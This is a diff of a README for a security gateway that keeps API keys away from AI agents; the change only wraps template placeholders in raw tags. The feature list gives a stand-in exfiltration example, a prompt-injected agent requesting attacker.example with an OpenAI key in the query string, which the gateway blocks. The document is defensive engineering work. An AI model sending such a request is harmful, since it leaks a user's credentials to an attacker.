@@ -78,8 +78,8 @@ agent's own restraint.
 
 ## What it does
 
-- **Holds the API key, not the agent.** Substitutes `{{secret:NAME}}` at the gateway boundary so the agent never sees the real value.
-- **Per-secret destination allowlist.** A prompt-injected agent calling `https://attacker.example/?key={{secret:OPENAI_KEY}}` returns 403 before the resolver is consulted.
+- **Holds the API key, not the agent.** Substitutes `{% raw %}{{secret:NAME}}{% endraw %}` at the gateway boundary so the agent never sees the real value.
+- **Per-secret destination allowlist.** A prompt-injected agent calling `https://attacker.example/?key={% raw %}{{secret:OPENAI_KEY}}{% endraw %}` returns 403 before the resolver is consulted.
 - **Multi-channel chat in.** `!secure` commands on Telegram, Matrix, WhatsApp; localhost paste UI for one-shot or bulk `.env` input.
 - **MCP server out.** Agents discover available secret *names* but never the values.
 - **Inbound + outbound content scanning.** Adversary-detector flags injection payloads on the way in, secret-shaped exfil on the way out.
